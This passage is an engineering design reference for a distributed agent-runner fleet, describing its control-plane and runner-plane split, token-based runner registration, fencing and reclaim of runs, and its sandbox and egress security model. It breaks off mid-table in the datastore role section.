# Runner Fleet: `agentsfleetd` control plane + host-resident `agentsfleet-runner` runner plane

> Parent: [`README.md`](./README.md) · Sibling: [`data_flow.md`](./data_flow.md) (how one turn flows through this split). · User-facing: [docs.agentsfleet.net/runners](https://docs.agentsfleet.net/runners).

> [!IMPORTANT]
> **Implemented (M80_002 cutover)**. This is the runtime the codebase runs now: `agentsfleetd` is the control plane and the host-resident `agentsfleet-runner` daemon is the runner plane. The old single-process `agentsfleetd worker` and the standalone sandbox sidecar are deleted.

[`data_flow.md`](./data_flow.md) traces a turn through it; this file is the structural picture.

Read this when a spec touches the `agentsfleet-runner` binary, the `/v1/runners` control protocol, runner registration, the node fleet, or assignment, fencing and reclaim.

---

## Facts

Every row is taken from the sections below; the owner column names the section that carries the full story.

| Invariant | Value | Mechanism | Owner section |
|---|---|---|---|
| Run expiry backstop | `RUN_TTL` = 35 s (single-sourced for the control plane in `af_core`'s timing constants) | the next eligible assignment re-runs an expired thread with a higher fencing token | §Failure recovery model |
| Max run duration | `MAX_RUNTIME` hard cap | `/renew` extends to `min(now+RUN_TTL, created_at+MAX_RUNTIME)` | §Per-run renewal |
| Stale-writer rejection | `UZ-RUN-005` | `report` verifies the monotonic `fencing_token` in the same atomic statement that flips the run | §System guarantees |
| Sandbox failure fails closed | `startup_posture` | the turn never runs; the run reports `fleet_error` naming why, and nothing runs unsandboxed in its place | §System guarantees |
| Renewal refused on empty wallet | `UZ-RUN-012` | each `/renew` meters the run's slice and refuses one the wallet cannot cover; reachable for any exhausted tenant | §Money gates |
| Lost wake recovery | the next recovery probe, at most 5 s later | each replica asks PostgreSQL for pending work every `ASSIGN_FALLBACK_TICK` (5 s), with or without a wake ring | §Failure recovery model |
| Runner datastore credentials | zero | no runner crate links `sqlx` or `async-nats`; the only platform surface is `/v1/runners` + `agt_r` | §The split |
| Control protocol | two registration routes, the rest under `/v1/runners/me` | listed in the API reference's **Runner plane** group, registration with the runner management routes (`public/openapi.json`); `me` resolves from the token | §The control protocol |
| Registration gate | `runner:register` for a platform runner, `runner:tenant` for a tenant's own | a caller without the scope, session JWT or `agt_t` key alike → `403`; `agt_r` revealed once, stored as sha256 | §Registering a runner |
| Fresh-mint liveness | `last_seen_at = 0` sentinel | a never-connected runner reads `registered`, not a fake `online` | §Runner state |
| Runner "status" | three separate categories | `status` enum + derived liveness + append-only `runner.history` | §Runner state |
| Memory isolation | one live holder per fleet | `thread.threads` keyed by the fleet's id + time gate + capture-time fencing | §Memory continuity |
| Memory window | category-pinned byte window | every `core` entry first (newest-first), then the newest non-core entries; deterministic | §Memory continuity |
| Per-runner metric families | 4, in a fixed 4096-series table | overflow routes to `runner_id="_other"`; bounded footprint; zero Postgres on the OTLP export path | §Observability |
| Multi-replica gauges | counters exact via `sum by`; `active_runs` approximate | the `+1` grant and `−1` release can land on different replicas | §Multi-replica |
| Sandbox tiers | 3 (`landlock_full` · `container_nested` · `dev_none`) | the daemon reconciles each against the host's report; tier is orthogonal to egress policy | §Sandbox tiers |
| Egress policies | 3 (`allow_all` · `deny_all_egress` · `allow_list_egress`) | host-side default-deny nf_tables rules on a veth pair; port 53 dropped; IPv4 only | §Egress model |
| Cancel latency | the runner's next Cancel message | archive and delete send Cancel to each live run's runner; a gate trip stops new runs only; the heartbeat names no run | §Steer, archive, delete |
| Config freshness | named by the assignment | the assignment returns the head revision id and a replica holds the parsed definition under that id, so the next run sees the change; no reload signal | §Config |
| Debit point | the run's usage, per renewal | the issued run's hold is reserved; each `/renew` and the report log the slice as a usage line that the biller settles after commit | §Money gates |
| Production shape | 3 `agentsfleetd` machines | set and verified by the release workflow; runner verbs load-balance across replicas | §Multi-replica |
| Turns queue | `thread.turns` where `settled_at IS NULL` | oldest unsettled row per fleet; parked heads block later work | §Datastore topology |

## Traps

Each trap is enforced in its owner section; this list is the index.

- Sticky routing is a performance hint, never ownership. Correctness never blocks on one runner being alive (§Runners are cattle, not pets).

- Do not fold runner status into one Kubernetes-style JSONB object; the three categories stay separate (§Runner state).

- There is no `runner_runtime` Postgres role, and there must never be one (§Datastore role model).

- `runner:register` is a token scope, not a Postgres role. It must not become a database `GRANT` (§Datastore role model).

- A lost wake needs no repair sweep; the next 5 s recovery probe reads PostgreSQL (§Failure recovery model).

- The three-run cap counts every run a turn was issued, whatever ended it. Three runs lost in a runner outage end the turn too, and a webhook turn has no replay (§Failure recovery model).

- Sandbox tiers are not egress policy. No tier substitutes for the egress model (§Sandbox tiers).

- The live tail is never the source of truth; `report` is the durable system of record (§Live activity).

- The wake ring only prioritizes candidates; the `thread.turns` ledger owns work (§Datastore topology).

- Not a general scheduler. No autoscale, no fairness engine, no arbitrary workload types (§Scope).

- Turn backlog is a shared-database census gauge; use the latest successful reading across replicas.

- Memory isolation does not rest on `fleet_id` scoping alone. A feature breaking single-live-holder must scope by `run_id` first (§Memory continuity).

- No secret enters a sandbox. Model keys and minted tokens stay in the supervisor, and bubblewrap starts every sandbox with a cleared environment (§Process-boundary hardening).

- Config is cached only by its head revision id, which every assignment reads, so the next run obeys an edit. Warm mode reuses only the sandbox shell (§Config).

- No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle. The deferred name layer is eBPF/FQDN (§Egress model).

## Topology

```text
 +- PLATFORM -------+        +- HOST (bare metal or a VM) -------+
 | agentsfleetd     |        | agentsfleet-runner (one binary)   |
 | control plane:   |<------>|  supervisor: heartbeat, run,    |
 | owns PG,         | HTTPS  |  agent loop, report, activity     |
 | NATS,            | pull   |  (boots from a pre-minted agt_r)  |
 | Vault API,       | agt_r  |                                   |
 | assignment       |        |  a sandbox per run that runs    |
 +--------+---------+        |  a tool there: executor, tools    |
          |                  +-----------------------------------+
   PG . NATS . Vault
   (never leave the platform)
```

Deeper diagrams stay with their owner sections below; signal routes are in [observability.md](./observability.md) §"Signal routing".

## Decisions

| Decision | Reason | Where |
|---|---|---|
| The runner holds zero datastore credentials | a compromised host cannot reach Postgres, NATS, or the Vault | §Why split; M80_002 |
| Operator pre-mints `agt_r`; no host self-registration | no enrollment-grade credential ever touches a host (Option B, the GitLab-16 model) | §Registering a runner; M84_001 |
| Typed columns + event log, not a `status` JSONB | one operator-intent dimension; JSONB conditions are for many writers | §Runner state; cross-validated Jun 2026 |
| Run expiry + fencing reclaims stalled work | a broker-side idle timer cannot see an off-platform processor | §Datastore topology; M80_001 |
| The thread fence and the turn's `run_fence` advance together | a stale runner must not settle a newer run | §Datastore topology |
| Cold-start reconciliation deferred | discovery scaffolding the future scheduler replaces (Indy-acked, M141_001 Discovery) | §Failure recovery model |
| The agent loop runs in the supervisor; only tool calls cross into a per-run sandbox | no model key or runner token enters a sandbox, and the supervisor keeps the network a sandbox may be denied | §The split; [`runner_execution.md`](./runner_execution.md) §Process model |
| Renewal meters the run per slice (M80_010), superseding the coverage-only check | a run is charged as it runs, so an empty wallet stops it at the next renewal | §Money gates |
| Launch egress is IP-pin `nftables`; the name-layer comes later via eBPF/FQDN | no proxy and no TLS interception, at any tier | §Egress model |
| Exact gauges via a deferred Postgres refresher | keeps the export path datastore-free; deferred at current scale | §The deferred refresher |

---

## Detail

Everything below is the full reference. Headings are stable and specs cite them by text. Insert new sections, never rename existing ones.

## System guarantees (read this first)

The runner fleet is the **runner plane**. Stateless runners run work, run it in a sandbox, and report back. The control plane (`agentsfleetd`) owns all durable state.

Everything below follows from that one decision. Read the guarantees before the mechanics, because the mechanics only exist to hold these.

| Guarantee | What the platform promises | How it holds |
|---|---|---|
| **No turn loss on runner death** | A runner that crashes, partitions, or is killed mid-turn never drops the turn. | The run has a `run_expires_at`; a later assignment re-runs the unsettled turn with a higher fence. Durability is at-least-once through `thread.turns` and the fenced assignment. |
| **At-most-once durable effect** | A reclaimed or duplicate runner cannot double-write state. | Every run carries a monotonic `fencing_token`; `report` verifies it in the same atomic statement that flips the run to `reported`. A stale holder's report is rejected (`UZ-RUN-005`). |
| **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the run inline over Transport Layer Security (TLS), is substituted at send time by the supervisor's egress guard outside every sandbox, and is never saved runner-side ([Runner runtime](./runner_execution.md) §Credentials). |
| **Tool calls are always sandboxed** | No tenant program ever runs un-isolated. | A run offered a tool that runs in a sandbox gets one under bubblewrap, Landlock, seccomp and its own cgroup; a sandbox that cannot be built fails **closed**: the turn never runs and the run reports `fleet_error` as `startup_posture`. A run whose tools all run in the supervisor starts none. |
| **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, NATS, or the Vault. | No runner crate links `sqlx` or `async-nats` ([`runner_execution.md`](./runner_execution.md) §Crates); the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |

### Runners are cattle, not pets

A runner has no durable identity that the platform depends on. The operator enrolls it once; it then runs, runs, reports, and may vanish at any moment. The control plane notices through run expiry and hands the work to whichever runner runs next.

There is no runner the fleet cannot lose. Sticky routing (below) is a *performance hint*, never ownership. Correctness never blocks on one runner being alive.

## Failure recovery model

A runner's work becomes eligible when its thread's run expires. The next assign pass pushes it to another eligible runner; recovery time depends on available capacity and fleet selection.

| Failure | Recovery | Durable guard |
|---|---|---|
| Runner dies mid-run | A later assign pass takes the same unsettled turn after its 35-second run expires. | The thread and turn receive a higher fence; the old holder cannot write. |
| Every run of one turn lapses | After three lapsed runs, the next assignment ends the turn as `fleet_error` with `run_expired`. A durable task's turn is exempt; its own run allowance bounds it. | The same transaction settles the turn, so the fleet's next turn can run. |
| Wake notification lost | The next 5 s recovery probe reads PostgreSQL without a hint. | Acceptance is already committed in `thread.turns`. |
| Assignment decoding fails | The transaction rolls back its thread and turn changes. | Both fences remain unchanged. |
| Failure after assignment commit | Release the run where possible; otherwise wait for its deadline. | Every write verifies the current thread and turn fences. |
| Report fails before commit | Retry the report; run, usage and settlement all roll back. | No charge or terminal turn without the report transaction. |
| Report response lost | The same runner retries and receives the stored outcome. | A repeated report adds no usage line or delivery. |
| Sandbox setup fails | The runner reports `fleet_error` as `startup_posture`. | Work never runs without the assigned sandbox. |

A live runner renews through the fenced `/renew` route. Renewal remains credit-gated and bounded by `MAX_RUNTIME`.
A runner that stops renewing loses its thread at the database deadline.

The replacement keeps the turn and reads its committed recovery descriptor.
Native tasks retain their task checkpoint owner; ordinary turns use a turn-owned head in `runner.turn_recovery`.
[Platform runner checkpoint recovery](runner_checkpoint_recovery.md) owns capture, restore and file safety.

An absent checkpoint starts from the original accepted input and unsettled folds.
A present invalid checkpoint refuses restore before model or tools.
Work after the saved boundary can repeat, including external effects.

### Per-run renewal: how a long fleet keeps its run

A native renewal batch extends active runs every five seconds. Each run carries the provider-request usage the daemon has not yet recorded.

The runner asks engines to stop nine seconds before its last confirmed deadline.
This leaves time to stop and reap their processes before another runner can reclaim work.
Renewal atomically extends **both** the run row and the thread row under a fence and the hard cap:

```text
 run issued                                every RENEWAL_TICK (5 s) tick
 (expires = now + RUN_TTL)              sends a native renewal batch
   |            tick    tick    tick    tick   tick
   *------------*-------*-------*-------*------*-------------------->
                                               | RenewBatch
                                               v
   server, in ONE fenced atomic statement:
     . still the fencing holder?  no -> 409 run_lost  -> runner cuts the run
     . credits cover the run?     no -> 402 no_credits  -> stop
     . past created_at+MAX_RUNTIME? yes -> 409 max_runtime -> stop + report
     . else -> extend run_expires_at AND thread.run_expires_at to
               min(now+RUN_TTL, created_at+MAX_RUNTIME); bump last_seen_at

   The tick renews whatever the run is doing, so a long model call with
   no output still renews. A runner that died ticks no more, and its run
   is reclaimed at the deadline. The runner heartbeats beside its runs
   (heartbeat, drainer and worker pool run joined), so a busy host still
   beats and lapse detection never reassigns a live long-runner's own run.
```

A transient renewal failure retries on the next tick. At the last granted deadline, the runner stops and another runner can reclaim unsettled work. Fences reject stale durable writes; external effects keep their own retry and idempotency limits.

## Scope: a runner plane, deliberately not a control plane

The fleet borrows Kubernetes, Nomad and Temporal **semantics**: runs, fencing, node heartbeats, drain, sticky scheduling and checkpointed workloads. It is **not** a general scheduler and must not drift into one. The non-goals are load-bearing; each rejected feature stays unbuilt until a spec changes this direction.

- **Not a general scheduler, beyond label placement.** Label placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in M85_001. The run query in `afd_fleet` matches `required_tags <@ labels`. Capacity, fairness and autoscale stay out of scope.

  The earlier "M80_007" reservation for this was a stale ID; M80_007 shipped as the runner-observability spec.

- **No autoscale.** Runners scale by operators adding hosts, not by the platform reacting to queue depth.

- **No fairness engine.** No per-tenant weighting, no priority lanes, no preemption.

- **No arbitrary workload types.** One workload: an agent run from a held `ExecutionPolicy`.

Without this fence the design rediscovers three control planes at once (Nomad-lite, Temporal-lite and Kubernetes-lite). Each would demand its own observability, reconciliation and high-availability story. The distributed-systems core here is sound; the risk is scope, not correctness.

If the platform ever needs a true control plane, that is a larger upfront conversation about inventory, reconciliation, high availability and placement fairness. Surface it; do not drift into it.

---

## Why split

The pre-cutover runtime ran one `agentsfleetd` binary as `serve` (the HTTP API) or `worker` (the coordination loop). The runtime also ran a standalone sandbox sidecar that owned sandboxing. Two facts made it impossible to run work on hosts the platform does not fully own:

1. **The worker was welded to the datastores.** Each per-fleet worker thread opened its own Postgres pool and datastore connections. It ran about 15 write patterns on the per-event hot path and read its own work from a per-fleet broker queue. It could not run anywhere it could not reach both datastores directly.

2. **The connection budget grew with the fleet**. Every per-fleet thread held a dedicated blocking datastore connection, so the connection pool ceiling capped the fleet count, not compute.

The cutover moved running onto arbitrary hosts (bare metal, a Mac, a pod) that hold **no datastore credentials**. They reach the platform only over the authenticated `/v1/runners` protocol.

## The split: two binaries, no sidecar

- **`agentsfleetd`**: the control plane. Owns Postgres, its NATS connection, the Vault API, the HTTP API, and work assignment, fencing and reclaim. Its `/v1/runners` endpoints assign inbound work from `thread.turns`; the delivery worker claims `thread.deliveries` rows.

- **`agentsfleet-runner`**: the host-resident runner plane, one Rust binary. A trusted supervisor runs the run loop and the agent loop, and each run that runs a tool in a sandbox gets one. It holds zero datastore credentials and talks to `agentsfleetd` only over Hypertext Transfer Protocol Secure (HTTPS), carrying a `runner_token`.

The BEFORE/NOW split diagram is front-loaded in §Topology.

**Why the loop stays out of the sandbox.** The agent loop calls the model with the run's key. The supervisor speaks the control protocol with the runner's token.

Neither may sit where a tenant program runs. So the supervisor runs outside every sandbox, and a sandbox runs tool calls and nothing else, over one Unix socket per run.

The sandbox is the same binary's `sandbox` entry, bound read-only into it. There is no second binary to deploy ([`runner_execution.md`](./runner_execution.md) §Process model).

### Where the code lives

The build graph keeps datastore crates outside the runner. [Runner process model](runner_execution.md#crates) owns the shared crate list, including cryptography for encrypted private reports.

The frozen `/v1/runners` wire types live in `af_wire`. The knobs both planes key off (`RUN_TTL` and friends) live in `af_core`, and both binaries build them. The control plane's run, fence, reclaim, assignment and sweeper code is `afd_fleet`, `afd_runner` and `afd_api_runner`, built only into `agentsfleetd`.

The runner's supervisor, agent loop, tool catalog, outbound guard, in-sandbox server and sandbox engine are the `afr_*` crates under `rustd/crates/`. They import nothing from the control plane.

## The control protocol: `/v1/runners`

`agentsfleetd` translates the runner's calls into the Postgres writes and NATS publishes the worker once made directly. The runner never sees a datastore.

The routes, their methods and their request and reply shapes are in the API reference's **Runner plane** group on docs.agentsfleet.net. That group is generated from `public/openapi.json`. The registration routes sit with the runner management routes; this doc does not restate them.

The shape that matters here has two registration routes (§Registering a runner). `POST /v1/admin/runners` is called by an operator. `POST /v1/tenants/me/runners` is called by a tenant for its own hosts.

Every other route sits under `/v1/runners/me` and is called by the runner with its `agt_r`.

`me` resolves from the token. No `runner_id` appears in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human* credential; everything else is authed by the machine credential it mints.

Identity and auth are covered in [`../AUTH.md`](../AUTH.md); the runner is the first machine principal. `register` is gated by the `runner:register` scope. The scope is grantable on its own, because enrolling a host into the shared fleet exposes every tenant's secrets to it.

A tenant's own route is gated by `runner:tenant`, because that host takes only its tenant's work.

A token without that scope is rejected `403`, tenant `admin` JWT and `agt_t` api_key alike.

### Heartbeats and pushed work

The runner sends a native heartbeat every ten seconds to report liveness, capabilities and held sandboxes.
The daemon pushes work when capacity is available; idle workers send no run requests.

Two missed heartbeat intervals close the connection.
A per-replica recovery probe finds queued turns after lost notifications.
The [runner guide](runner_protocol.md) describes connection setup, cancellation and recovery.

## Registering a runner

A runner needs a `agt_r` token before it can receive work. The **platform operator pre-mints it through the CLI** and installs it on the host. The host never self-registers (Option B, the GitLab-16 "create runner → authentication token" model).

The operator runs `agentsfleet platform runners register --host-id <HOST> --policy <FILE> --token-out <NEW_FILE>`.
The CLI calls `POST /v1/admin/runners` and saves the one-time runner token in an owner-only file.
The platform registers a host once: a second registration of the same `host_id` answers `409`, and its `Location` names the existing runner, whose token the operator rotates.
The operator installs that token on the host as `AGENTSFLEET_RUNNER_TOKEN`.

No identity credential ever touches a shell (M84_001 retired the `register --token` CLI). On boot the runner validates the `agt_r` prefix and fails loud rather than looping on a silent 401.

It then opens its native connection and starts the worker pool. There is no register call, so no host ever holds a registration-grade credential.

There is no registration token. The minter must hold `runner:register`, or `runner:tenant` for a tenant's own host. The open-fleet, self-registering case is mode C, later.

```text
 platform admin                                          agentsfleetd
 (CLI credential carrying runner:register)
   | CLI enrollment -> POST /v1/admin/runners   GATE 1 - who may enroll:
   |   Authorization: Bearer <session-JWT>           runner:register scope required
   |   { host_id, assigned_policy{sandbox_tier,     (tenant admin / agt_t -> 403)
   |     network_policy, registry_allowlist[],
   |     worker_count}, labels[] }
   +------------------------------------------------>| mint agt_r (256-bit random)
   |                                                  | store sha256(agt_r) + last_seen_at=0 + the ASSIGNED policy in runner.runners
   |<-------------------------------------------------+ 201 { runner_id, runner_token: agt_r, assigned_policy }  (revealed once)
   | admin installs agt_r on the host (vault -> env AGENTSFLEET_RUNNER_TOKEN)
   v
 host: agentsfleet-runner
 (env AGENTSFLEET_API_URL + AGENTSFLEET_RUNNER_TOKEN=agt_r... [+ optional RUNNER_STORAGE_HOME])
   | boot: validate agt_r prefix, NO register call; probe kernel capability
   | steady loop - Authorization: Bearer agt_r         GATE 2 - per-call auth:
   |      <-- heartbeat . run . report . activity --| sha256(Bearer) == token_hash (timing-safe)
   |      heartbeat ^ capability report . v assigned policy + degraded verdict
   |      eligibility: assigned tier + scope                     GATE 3 - blast radius
```

`agentsfleetd` owns the Postgres pool, the NATS connection, and the Vault API. `agentsfleet-runner` owns none of them and holds only the `agt_r` token. A platform operator holding `runner:write` rotates it with `PATCH /v1/admin/runners/{id} {"action":"rotate"}`.

The write swaps `token_hash` and appends an actor-attributed event atomically. The write returns the replacement token once, and makes the old token fail the next auth read.

Revoking instead sets `status='revoked'` (M84_002) so every later call gets a 401. The runner's complete environment is `AGENTSFLEET_API_URL` plus `AGENTSFLEET_RUNNER_TOKEN`, with the optional host-local `RUNNER_STORAGE_HOME`. There is no bootstrap credential on the host, no datastore secret, and **no policy in the environment** (M148; §Assigned policy and reconciliation).

### A tenant's own runner

A tenant that holds `runner:tenant` registers a host of its own with `agentsfleet runners register`.
The CLI calls `POST /v1/tenants/me/runners`, which takes no `Idempotency-Key`: a tenant registers a host once.
A second registration of the same `host_id` answers `409`, and its `Location` names the existing runner.
The tenant recovers that runner's token with its `rotate` action.
The row records the tenant, and nothing changes it afterwards.

A tenant runner takes only its own tenant's work, and never a fleet that runs on the platform model.
The platform key therefore never reaches a host that its tenant controls.

```text
                              runner's tenant_id
work of tenant T              NULL (platform)    T          U (another tenant)
fleet on the platform model   held             refused    refused
fleet on T's own model        held             held     refused
```

The candidate scan and the assign statement both apply this table.
Issue applies it again under the host lock, and logs `runner_placement_refused` (`UZ-RUN-027`) when the assignment let a placement through.
Labels place work and carry no security meaning, so a tenant that labels its runner cannot make it take another tenant's work.

A platform admin can cordon, drain, revoke and relabel a tenant runner.
Only the tenant rotates its token, and a platform rotation answers `409 UZ-RUN-026`.

## Assigned policy and reconciliation (M148)

Configuration flows **down**. Sandbox tier, network policy, registry allowlist and worker count are attributes the control plane ASSIGNS to the runner row. They are written at enrollment and changed through `PATCH /v1/admin/runners/{id} {assigned_policy}`.

Each one rides the runner's identity on the enrollment read and on **every heartbeat reply**. A dashboard change so reaches the host within one beat, and nobody visits the host.

**Durable tasks** follows that assignment path through the required `durable_tasks_enabled` boolean.
New and migrated assignments default to On; whole-policy writes must carry the saved value explicitly.
An Off value prevents new durable runs, including initial work from durable-task setup, without changing ordinary work eligibility.

Supported software still advertises `durable_tasks_v1` while its assignment is Off.
Existing durable runs retain their frozen mode, input, recovery, accounting and report duties.
The candidate, assignment and final issue checks all require configured support before a new durable run commits.

The **heartbeat cadence travels the same way** (M205). `af_core::timing` owns both `RUNNER_OFFLINE_AFTER` and the `HEARTBEAT_INTERVAL` served beneath it. A compile-time assertion beside them keeps the served cadence strictly below the offline threshold.

A host holds no interval of its own, so moving the threshold moves every host's beat within one cycle. The field is required rather than optional.

A reply without it is refused at parse, and the beat takes the existing backoff. A runner guessing its own cadence is the drift this removes.

The host never declares policy. The per-policy environment variables that once did are removed outright rather than deprecated.

No fallback path lets two sources of truth diverge. That removes a real failure.

A dev worker advertised `landlock_full` while refusing every run for two days. The dashboard's tier and the host's env file disagreed, and nothing compared them.

Capability must be established before it can be reported. The runner starts under systemd's `Delegate=cpu io memory pids` with `DelegateSubgroup=runner`, in a leaf of its own, holding the service's cgroup (`deploy/baremetal/agentsfleet-runner.service`). The runner reads that cgroup from `/proc/self/cgroup` and makes every run's cgroup beneath it (`afr_sandbox`'s cgroup module).

The runner playbook's readiness check fails a host whose service cgroup lacks any required controller in its `cgroup.subtree_control` (`playbooks/lib/runner/verify.sh`).

Capability flows **up**. At boot the runner probes what the kernel can enforce.

The probe covers Landlock, seccomp, the delegated cgroup's controllers, bubblewrap, the toolbox's file system and `/dev/kvm`. It also covers the egress scope build (§Egress model). A host lacking any mechanism every sandbox needs refuses `run` and says which.

Every heartbeat carries the boot probe's report, with `egress_enforcement` set from the egress check (`afr_supervisor`'s capability and heartbeat modules).

The heartbeat handler reconciles assigned against achievable through a pure verdict function (`afd_runner`'s reconcile module). It writes the row's `degraded` flag and `degraded_reason`.

The reason names the one missing mechanism in operator vocabulary. "cgroup controllers not delegated" maps to a bootstrap playbook step.

The verdict gates work on **both sides, and fails closed**. The control plane's run handler issues nothing to a degraded row, and an unreadable verdict also issues nothing. The runner's workers take no work while no decodable assignment is held.

A null policy sets the worker count to zero, never the previous value and never a permissive default (`afr_supervisor`'s heartbeat module). The workers do not read `degraded`; the run handler's refusal is the one gate a degraded row meets.

A policy re-assignment re-reconciles the verdict **inside the PATCH request**, against the stored report. A tightening the host provably cannot meet degrades the row and closes the run gate immediately.

Two windows stay open, both deliberate. A host that *can* meet the new policy keeps running under its issue-time policy until the next beat delivers the change.

The bound is the documented heartbeat granularity. The run gate's read also races a concurrent verdict write by at most one run.

The assumption behind both windows is that in-flight runs finish under the policy they were issued under.

Assigned and achievable live in **separate columns** that never overwrite each other. No code path can let a self-report become the assignment.

Recovery is reconciliation and nothing more. A later report that satisfies the assignment clears the verdict on that heartbeat, and running resumes.

The report is unauthenticated self-assertion, so a compromised host can lie. Placement trust therefore stays operator-assigned; attestation is a separate workstream.

## Runner state: three categories, no JSONB status

A runner's "status" is three *separate* concerns. Folding them into one Kubernetes-style `status` JSONB object is the trap we deliberately avoid (cross-validated Jun 2026).

Kubernetes needs `status.conditions[]` because dozens of controllers write orthogonal state onto one object. The fleet has one operator-intent dimension and a simple pull/run loop. Typed columns plus an event log therefore stay clearer and queryable.

| Category | Where it lives | Examples | Stored? |
|---|---|---|---|
| **Operator intent** | `runner.runners.status` (typed enum) | `active` · `cordoned` · `draining` · `drained` · `revoked` | **yes**. `status != 'active'` is the cordon/revoke auth gate (M84_002) |
| **Automatic quarantine** | `runner.runners.cordon_reason`, `cordoned_at`, `cordon_healthy_since_at` | `missed_heartbeats`; independent of operator intent | **yes**. Guarded assignments read it; valid heartbeats own the return proof |
| **Runtime liveness** | **derived** at read from `last_seen_at` + runs | `registered` · `online` · `busy` · `offline` | **no**. A pure function; storing it would drift |
| **History** | `runner.history` (append-only) | `runner_registered` · `run_acquired` · `runner_offline` · `runner_revoked` | **yes**. Answers "last busy?", "runs this period", "offline how long?" |

Liveness is honest because **mint stores `last_seen_at = 0`** (the never-connected sentinel). A freshly-minted runner reads **registered**, not a fake **online**, until its first heartbeat moves `last_seen_at` forward (M84_001).

"Auth failed" is *not* a runner state. Identity is the token, so a bad `agt_r` matches no row. The failure surfaces in logs and metrics, never as a row's liveness.

A Kubernetes-style `status` plus `conditions` JSONB split is adopted **only if** many independent subsystems ever write runner conditions. Examples are health probes, maintenance, capacity and security. Until then, it is not adopted.

### Automatic quarantine and return

After 105 seconds without a valid heartbeat, the liveness sweep records one offline episode and an automatic cordon in one transaction.
The sweep leaves run and thread deadlines unchanged.
New fleet and setup assignments refuse the cordoned host under its row lock.

Healthy heartbeats from the current connection must continue for 30 seconds before the automatic cordon lifts.
A gap of at least 20 seconds, failed health proof or fallback touch resets that interval.
Lifting automatic quarantine preserves an operator's cordon, drain or revocation.

`afd_runner/src/sweep/liveness`, `heartbeat/cordon.rs` and their SQL own these transitions.
The bounded sweep selects actionable silent hosts and drains, so old episodes do not hide new failures.

Operators with `runner:read` inspect the reason, time and return rule through the command-line interface (CLI):

```sh
agentsfleet platform runners list
agentsfleet platform runners show <RUNNER_ID>
agentsfleet platform runners events <RUNNER_ID> --event-type runner_offline,runner_cordoned,runner_uncordoned
agentsfleet platform runners runs <RUNNER_ID>
```

### Operator plane + reassignment

Operators read runners through `GET /v1/admin/runners` and change them through `PATCH /v1/admin/runners/{id}`. The read derives liveness and excludes token hashes. Lifecycle changes append actor-attributed runner events.

A runner can hold multiple active runs. Busy status derives from live runs; the server counts fleet and setup occupancy under the runner-row lock before granting capacity. [Setup runs](#setup-runs) describes the shared limit.

> [!WARNING]
> Cordon and drain currently block every authenticated runner request, including renewal and reports. The capacity layer permits cordoned or draining renewals, but authentication accepts only `active` tokens (`afd_state`'s credential rows and `afd_auth`'s authenticate step). Do not rely on these actions for graceful completion; existing work can stop and reports can remain spooled.

### Operator plane: the read surface

The runner detail read (API reference › Fleet) answers the runner and its live work. It holds no run totals.

Runs acquired, succeeded, failed and expired per runner are the metric `agentsfleet_runner_runs_total`, read in Grafana (§"The four per-runner families"). Each count is recorded after the transaction that moved the run commits, so a rolled-back transaction counts nothing. A stopped run counts as failed.

`acquired` follows the run insert's commit, `succeeded` and `failed` the report's settle, and `expired` the reclaim flip. A retried report or assignment that wins no row counts nothing, by the same guards that make the transitions exactly-once.

The live-now summary reads `thread.runs`, scoped to currently-active rows.

Run history: API reference › Fleet (List a runner's runs). Neither item struct carries `token_hash` or `request_json`, so emitting either is a compile error rather than a review catch.

A settled run outlives its fleet's purge and its turn's retention. `thread.runs` holds no foreign key to either, and the purge deletes only the fleet's live runs. The history so keeps the run with null fleet and turn fields.

Each item carries `destination`: `available` when the fleet exists in the caller's own account, `fleet_deleted`, or `not_permitted`. The dashboard's Open fleet link follows that field, never a fleet name.

**Lifecycle events and work events are different planes.** A successful run appends both `run_acquired` and `run_released`. A runner's raw event log so roughly doubles its run count; 4,000 runs read as about 8,000 rows.

The dashboard splits them. The **Runs** tab renders work, one row per run with its outcome and the shared plain-English failure sentence. The **Activity** tab renders lifecycle records only.

The client asks for the seven-tag lifecycle set (`RUNNER_LIFECYCLE_EVENT_TYPES`, one exported constant) through the comma-separated multi-value `event_type` filter. The activity headline map is keyed on that subset, so a run tag cannot be given a headline at compile time.

`thread.runs` gains a row per assignment and another per reclaim.
A worker turning one short turn every `RUN_TTL` adds about 2.5k rows daily.
At `MAX_WORKER_COUNT`, that becomes about 158k rows.

Two indexes serve the read. `idx_runs_runner_id_created_at_id` answers the page, and `idx_runs_turn_id_fencing_token` answers the per-row reclaim derivation.

On `runner.history`, `idx_history_runner_id_event_type_created_at_id` serves the Activity page's rare-lifecycle-tag filter and its count. That read therefore stops walking the per-run bulk.

A partial index was rejected there. The tag list binds as a parameter array, and a partial-index predicate cannot be proven against one. Read cost stays flat as history grows, and the index-usage integration lane pins both the shapes and the plans.

**History is kept until a retention policy is chosen.** No sweeper deletes finished runs or runner events (Indy, Nov 21, 2026). `thread.runs` and `runner.history` grow with every assignment and every run event.

No clock moves a run out of `active`. The runner's report, the fleet's next assignment through `queue::ASSIGN_HEAD`, and fleet deletion do. A run whose runner died, on a fleet nobody messages again, stays `active` past its `run_expires_at`. The expiry sweeper still bills its last slice.

Pagination: [HTTP standard](../../.orly/standards/domains/http-responses.md) HTTP-PAGE and the API reference introduction.

### The open policy questions

The surface shipped; what it should *do* in these four cases did not.

- **All-runners-down.** If every healthy runner is gone, where does cordoned or lapsed work drain to? There is no eligible target, so the work must **hold** (not thrash or fail) until capacity returns.

- **Eligibility.** Label, state, liveness, tenant ownership and shared host-capacity checks precede placement (§A tenant's own runner). Trust class, workspace scope and sandbox-engine eligibility remain future work.

- **Cordon rules.** When to cordon; partial versus full drain; the drain deadline; what happens if drain never completes (escalate cordon to revoke?).

- **Drain rules.** How long to wait for in-flight work before reclaiming; how the heartbeat `drain` reply composes with renewal.

## Datastore role model: why there is no `runner_runtime`

Access to the runner-domain tables (`runner.runners`, `thread.runs`, `thread.threads`) is governed at **two independent layers**. Conflating them is the recurring design error. The temptation to mint a `runner_runtime` database role "so the runner tables have an owner" collapses an authorization rule onto an authentication identity.

| Layer | Mechanism | Answers | Enforced where |
|-------|-----------|---------|----------------|
| **App authorization** | the `runner:register` scope on the verified token | *Which API caller* may enroll / list / manage runners | the request handlers' authorization layer |
